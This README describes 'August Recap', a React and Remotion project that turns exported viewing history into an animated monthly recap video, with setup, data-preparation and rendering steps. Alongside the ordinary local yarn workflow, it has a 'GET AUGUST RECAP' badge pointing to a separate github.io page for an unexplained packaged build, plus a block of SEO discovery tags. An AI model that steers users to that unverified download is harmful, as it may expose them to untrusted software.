# August Recap - Turn A Month Of Activity Into A Shareable Video Story

<p align="center">
  <img src="logo.png" width="180" alt="August Recap trophy logo">
</p>

August Recap is a React and Remotion project for turning a month of viewing activity into a compact, animated recap. It takes an exported history, converts the records into a small TypeScript data set, and renders the result as a sequence of titles, totals, active dates, favorite entries, and most-binged highlights. The included scene library also shows how a simple monthly recap can grow into a broader year-in-review presentation without replacing the core workflow.

The project is designed around a clear idea: Personal statistics are easier to understand when they are presented as a story. Instead of leaving August activity in a CSV file, August Recap gives it pacing, color, transitions, typography, and a final video that can be replayed or shared. The default composition focuses on viewing history, while the archived scene examples provide patterns for coding activity, contribution totals, issue counts, top languages, flash cards, and end cards.

## At A Glance

- Build an August recap from exported viewing records.
- Preview every scene in Remotion before rendering.
- Highlight active years, favorite titles, and binge patterns.
- Keep the input local as a small array of `Title` and `Date` objects.
- Adjust the visual identity through two central color values.
- Render a complete MP4 with the bundled build command.
- Reuse scene patterns from the 2021 and current example folders.
- Extend the same structure into a movie recap, film recap, or creator activity summary.

![Animated August Recap preview](assets/netflixUnwrapped.gif)

The preview demonstrates the composition style inherited from the viewing-history project. Audio can be part of the rendered result even when an animated preview does not reproduce it. The important workflow remains the same: Prepare the records, inspect the composition, and render only after the timing and text look right.

## What The Project Contains

| Area | Purpose | Main Files |
|---|---|---|
| Composition entry | Registers the Remotion video and its render target. | `src/index.tsx`, `src/Video.tsx` |
| Story sequence | Connects the major August recap scenes. | `src/Main.tsx` |
| Activity data | Stores converted viewing records. | `src/Main/watchHistory.ts` |
| Visual settings | Keeps the primary gradient colors together. | `src/Main/config.ts` |
| Recap scenes | Displays titles, subtitles, active dates, lists, and binge results. | `src/Main/` |
| Scene references | Preserves additional year-in-review building blocks. | `examples/2021/`, `examples/current/` |
| Media | Holds the animated preview and visual assets. | `assets/` |

The main composition is intentionally small. This makes it practical to use August Recap as a focused monthly recap instead of carrying a large service stack. The `examples/2021` directory contains more elaborate Remotion sequences such as contribution totals, weekday summaries, language cards, issue scenes, decorative lines, transitions, and closing cards. The `examples/current` directory adds compact motion and planet helpers that can inspire a different visual direction.

## How The Recap Pipeline Works

The source projects use a direct data-to-story pipeline. August Recap keeps that approach:

```text
Exported activity
       |
       v
CSV records converted to JSON objects
       |
       v
src/Main/watchHistory.ts
       |
       v
React scenes and Remotion timing
       |
       v
Local preview
       |
       v
Rendered MP4
```

Each activity item needs a title and date. The starter data file already contains the expected object shape:

```ts
export const watchHistory = [
  {
    Title: 'Example title',
    Date: '8/12/26',
  },
];
```

Filter the export to August before inserting the array when the goal is a strict August recap. Keeping the filtering step outside the composition makes the input easy to inspect and lets the video remain deterministic. A different month or date range can use the same scene sequence by replacing the records.

## Get The Build

[![GET AUGUST RECAP](https://img.shields.io/badge/GET%20AUGUST%20RECAP-01064A?style=for-the-badge&logoColor=white)](https://august-recap.github.io/august-recap/august-recap)

The button provides the packaged route. For a local setup, use PowerShell from the extracted project directory:

```powershell
Set-Location .\august-recap
yarn
yarn start
```

The project expects Node.js, Yarn, and a local browser. Dependency installation brings in React, TypeScript, styled-components, the Remotion command line tools, the renderer, and the bundler. The preview command opens Remotion Studio with the registered `Main` composition.

If Yarn is not available yet, enable the package manager shim that ships with current Node.js releases and run the setup again:

```powershell
corepack enable
yarn
yarn start
```

## Prepare Your August Data

1. Export the activity history from the service that owns the records.
2. Keep the rows that belong to August and remove entries that should not appear.
3. Convert the CSV rows into a JSON array.
4. Open `src/Main/watchHistory.ts`.
5. Replace the starter object with the converted array.
6. Save the file and check the preview.

The field names are case-sensitive. Use `Title` for the item label and `Date` for its activity date. A clean input array gives the August recap predictable totals and prevents malformed rows from reaching the visual scenes. If the source export contains episode names, the list and binge calculations can group repeated series activity into a more useful monthly recap.

## Preview, Test, And Render

Run the interactive preview while changing data, copy, colors, or timing:

```console
yarn start
```

Use the project checks before creating the final video:

```console
yarn test
```

This command runs ESLint across the source tree and then checks the TypeScript project. When the preview and checks are ready, render the composition:

```console
yarn run build
```

The build command renders the `Main` composition to `out/netflixUnwrapped.mp4`. Rename the completed file after rendering if the distribution needs an August-specific filename. Rendering takes longer than previewing because every frame is produced at full quality.

## Shape The Visual Story

The simplest customization is the palette. Change `COLOR_1` and `COLOR_2` in `src/Main/config.ts` to create a new gradient while keeping contrast readable. The supplied navy trophy, calendar, and illustrated rocket assets provide a visual starting point for achievement, date, and progress motifs.

![August Recap rocket illustration](assets/rocket.png)

The scene files divide the story into manageable pieces:

- `src/Main/Title.tsx` introduces the recap.
- `src/Main/Subtitle.tsx` establishes the next beat.
- `src/Main/ActiveYear.tsx` summarizes the active period.
- `src/Main/ShowList.tsx` presents selected titles.
- `src/Main/MostBinged.tsx` closes around repeated viewing activity.

For a longer video recap, review `examples/2021`. `examples/2021/TotalContributions.tsx`, `examples/2021/TopWeekday.tsx`, `examples/2021/ManyLanguages.tsx`, `examples/2021/Issues.tsx`, and `examples/2021/Flashcard.tsx` demonstrate how numeric facts can become independent scenes. `examples/2021/Transition.tsx`, `examples/2021/DecorativeLines.tsx`, and `examples/2021/Decoration.tsx` show how to connect those facts without turning the recap into a static report. `examples/2021/EndCard.tsx` and `examples/2021/EndCard2.tsx` provide closing patterns for a shareable result.

These references can support several adaptations. A movie recap can replace viewing rows with watched films. A YouTube recap can use titles from channel or watch activity. A film recap can emphasize genre, repeat viewing, and active days. A coding recap can borrow contribution and language scenes. In each case, the strongest result comes from a narrow data set and a short list of meaningful highlights.

## Practical Notes

- Keep personal exports out of commits when they contain private history.
- Preview long titles because line wrapping changes scene balance.
- Check date formatting before calculating an active period.
- Keep the August data set stable while tuning animation timing.
- Use the animated preview for a quick review and the MP4 for final playback.
- Treat the example folders as a scene catalog rather than a second application.
- Review `package.json` for the dependency versions, scripts, and distribution status included with this snapshot.

August Recap does not require a database, hosted API, or cloud rendering account for the bundled composition. The local workflow is enough for preparing data, previewing scenes, checking TypeScript, and rendering the video. Larger deployments can adopt caching and distributed rendering patterns from the source projects, but they are separate from the compact monthly build.

## Discovery Tags

august recap, monthly recap, movie recap, youtube recap, film recap, video recap, unwrapped, year in review, activity summary, personalized stats, viewing history, Remotion video

## Project Map

Start with `src/Main/watchHistory.ts` for data, `src/Main/config.ts` for color, and `src/Main.tsx` for scene order. Use `yarn start` for iteration, `yarn test` for checks, and `yarn run build` for the final render. The result is a repeatable August recap workflow built from real activity records and reusable Remotion scenes.
